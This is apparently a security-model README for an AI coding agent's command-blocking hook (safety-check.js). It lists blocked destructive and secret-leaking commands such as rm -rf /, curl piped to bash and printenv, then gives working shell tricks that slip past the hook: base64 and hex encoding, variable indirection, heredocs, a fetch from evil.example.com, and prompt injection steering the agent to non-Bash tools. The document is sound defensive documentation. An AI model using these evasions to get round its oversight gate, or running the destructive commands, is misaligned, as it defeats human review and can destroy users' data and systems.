# Hooks Security Model

This document describes what the hooks in this directory protect against — and, importantly, what they do **not** protect against. Read this before adding rules or relying on the safety hook.

## TL;DR

`safety-check.js` is a **human-in-loop oversight gate**, not a sandbox. It catches accidental destructive commands typed by Claude or copied from documentation. It is **not** designed to stop a sophisticated adversary or even a moderately motivated one.

If your threat model includes hostile prompt injection, untrusted user input, or supply-chain attacks, you need additional controls outside this hook (containerization, restricted IAM roles, network egress controls, code review).

---

## What the hooks protect against

`safety-check.js` (PreToolUse) blocks the tool call before it runs. It catches:

- **Accidental destructive commands typed plainly**: `rm -rf /`, `git reset --hard`, `git branch -D main`, `Remove-Item -Recurse -Force`, `del /f`.
- **Cloud resource deletions**: `az group delete`, `az keyvault delete`, `az sql server delete`, etc. — the things that ruin a Friday afternoon.
- **SQL destruction**: `DROP TABLE`, `TRUNCATE TABLE`, `DELETE FROM` invoked through Bash (e.g. `sqlcmd`, `psql`). Note: only Bash invocations, not when these strings appear inside a Write to a `.md` file.
- **Process kills**: `taskkill /f`, `kill -9`, `Stop-Process -Force`.
- **Package publishing**: `npm publish`, `dotnet nuget push` — irreversible operations.
- **Git operations needing approval**: `git commit`, `git push` — by policy these need human sign-off.
- **Plain-text supply chain risks**: `curl … | bash`, `wget … | sh`, `iex … web…`.
- **Plain-text credential leaks**: `curl …password=…`, `echo $API_KEY`, `printenv`.
- **Hardcoded secrets in Write content**: PEM private-key headers, or the heuristic "long token + secret-keyword" combo. Skipped for `.md`/`.mdx`/`.rst`/`.txt` and any `docs/` path so docs can quote the patterns.

`drift-check.js` (PostToolUse) protects task-file consistency, not security.

`session-log.js`, `pre-compact.js`, `catalog-trigger.js` are housekeeping. They have no security role.

---

## What the hooks do NOT protect against

Anything that obscures the command from a literal regex match. Treat this list as adversarial — every example below bypasses `safety-check.js`:

### Encoding / decoding tricks
```bash
eval "$(echo cm0gLXJmIC8= | base64 -d)"     # base64-encoded `rm -rf /`
echo -e '\x72\x6d\x20\x2d\x72\x66' | bash   # hex-escaped
```

### Variable indirection
```bash
X='rm -rf /'; bash -c "$X"
CMD=rm; FLAGS=-rf; $CMD $FLAGS /
```

### IFS / globbing splits
```bash
{r,m}\ -rf\ /
r''m -rf /
```

### Heredoc obfuscation
```bash
bash <<'EOF'
rm -rf /
EOF
```

### Indirect invocation
```bash
sh -c "$(curl -s evil.example.com/script.sh)"   # the curl rule may catch this; the inner content is unseen
alias dropdb='psql -c "DROP TABLE users"'; dropdb
```

### Tool-surface evasion
- A command run via the `Edit` tool's pre/post hooks (out of scope for safety-check).
- A command issued through an MCP server tool whose name is not `Bash` or `Write`.
- A command embedded in a script file written via `Write`, then later executed via `Bash`.

### Adversarial prompt injection
If a malicious document convinces Claude to use a non-Bash tool (e.g. an MCP server's `execute_remote_command`), `safety-check.js` never sees it. The hook only matches on `tool_name === 'Bash' | 'Write'`.

---

## Threat model

| Actor | Trust level | Protected? |
|---|---|---|
| Claude generating obvious destructive commands by mistake | Trusted but fallible | **Yes** |
| Claude copying from docs / examples that include destructive shapes | Trusted but fallible | **Yes** |
| Operator typing dangerous commands into an Agent-mode prompt | Trusted but fallible | **Yes** |
| Adversarial prompt injection trying to bypass the regex | Hostile | **No** |
| A malicious MCP server | Hostile | **No** — outside the Bash/Write surface |
| A compromised dependency that runs `rm -rf` at install time | Hostile | **No** — the install runs before/outside the hook |
| A user who knows shell tricks and wants to bypass | Hostile | **No** |

If your threat model includes the bottom four rows, run Claude inside a container with restricted IAM, no production network egress, and no production credentials mounted.

---

## How to extend the rules

Add to either `BASH_RULES` or `WRITE_RULES` in [safety-check.js](safety-check.js):

```js
{ id: 'short-id', re: /\bsome\s+regex\b/i, reason: 'human-readable reason' }
```

- **`id`**: short identifier emitted to `tasks/metrics.jsonl` so you can track which rules fire most often via `/retro`.
- **`re`**: a regex applied with `.test()`. Use word boundaries (`\b`) to avoid substring matches (e.g. `confirm` matching `rm`).
- **`reason`**: shown to Claude when the deny fires; should suggest the safer alternative.

When adding a rule, also add a positive **and** negative test case to [__tests__/safety-check.test.js](__tests__/safety-check.test.js). The negative case is more important — it documents the false-positive boundary you intend.

---

## Reporting issues

If you discover a bypass that should have been caught (i.e. a plain command that the rules miss), open an issue or add a rule + test in the same PR. If you discover an exploit that requires obfuscation, that is by design — see "Threat model" above.
